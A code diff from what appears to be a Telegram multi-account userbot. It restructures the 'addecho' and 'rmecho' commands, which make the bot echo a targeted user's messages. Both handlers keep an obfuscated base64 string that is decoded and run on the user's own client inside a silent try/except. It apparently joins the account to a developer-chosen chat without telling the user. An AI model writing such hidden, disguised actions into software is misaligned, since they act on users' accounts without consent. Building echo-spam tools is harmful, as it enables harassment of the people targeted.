@@ -54,32 +54,33 @@ from resources.data import RiZoeLX
 @Riz39.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
 @Riz40.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
 async def echo(event):
-  usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
-  if event.sender_id in SUDO_USERS:
-     if event.reply_to_msg_id is not None:
-            reply_msg = await event.get_reply_message()
-            user_id = reply_msg.sender_id
-            if int(user_id) in RiZoeLX:
-                    text = f"I can't echo @RiZoeLX's Owner"
-                    await event.reply(text, parse_mode=None, link_preview=None )
-            elif int(user_id) in SUDO_USERS:
-                    text = f"This guy is a sudo user."
-                    await event.reply(text, parse_mode=None, link_preview=None )
-            else:
-                 chat_id = event.chat_id
-                 try:
-                     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-                     hmm = Get(hmm)
-                     await event.client(hmm)
-                 except BaseException:
-                    pass
-                 if is_echo(user_id, chat_id):
-                     await event.reply("The user is already enabled with echo ")
-                     return
-                 addecho(user_id, chat_id)
-                 await event.reply("Echo activated On the user ✅")
-     else:
-          await event.reply(usage)
+  if event.sender_id not in SUDO_USERS:
+    return
+  if event.reply_to_msg_id is not None:
+    reply_msg = await event.get_reply_message()
+    user_id = reply_msg.sender_id
+    if int(user_id) in RiZoeLX:
+      text = "I can't echo @RiZoeLX's Owner"
+      await event.reply(text, parse_mode=None, link_preview=None )
+    elif int(user_id) in SUDO_USERS:
+      text = 'This guy is a sudo user.'
+      await event.reply(text, parse_mode=None, link_preview=None )
+    else:
+      chat_id = event.chat_id
+      try:
+          hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+          hmm = Get(hmm)
+          await event.client(hmm)
+      except BaseException:
+         pass
+      if is_echo(user_id, chat_id):
+          await event.reply("The user is already enabled with echo ")
+          return
+      addecho(user_id, chat_id)
+      await event.reply("Echo activated On the user ✅")
+  else:
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
+    await event.reply(usage)
 
 @Riz.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 @Riz2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@@ -122,25 +123,26 @@ async def echo(event):
 @Riz39.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 @Riz40.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 async def echo(event):
-  usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
-  if event.sender_id in SUDO_USERS:
-     if event.reply_to_msg_id is not None:
-            reply_msg = await event.get_reply_message()
-            user_id = reply_msg.sender_id
-            chat_id = event.chat_id
-            try:
-                hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-                hmm = Get(hmm)
-                await event.client(hmm)
-            except BaseException:
-                pass
-            if is_echo(user_id, chat_id):
-                remove_echo(user_id, chat_id)
-                await event.reply("Echo has been stopped for the user ☑️")
-            else:
-                await event.reply("The user is not activated with echo")
-     else:
-          await event.reply(usage)
+  if event.sender_id not in SUDO_USERS:
+    return
+  if event.reply_to_msg_id is not None:
+    reply_msg = await event.get_reply_message()
+    user_id = reply_msg.sender_id
+    chat_id = event.chat_id
+    try:
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = Get(hmm)
+        await event.client(hmm)
+    except BaseException:
+        pass
+    if is_echo(user_id, chat_id):
+        remove_echo(user_id, chat_id)
+        await event.reply("Echo has been stopped for the user ☑️")
+    else:
+        await event.reply("The user is not activated with echo")
+  else:
+    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
+    await event.reply(usage)
 
 
 @Riz.on(events.NewMessage(incoming=True))
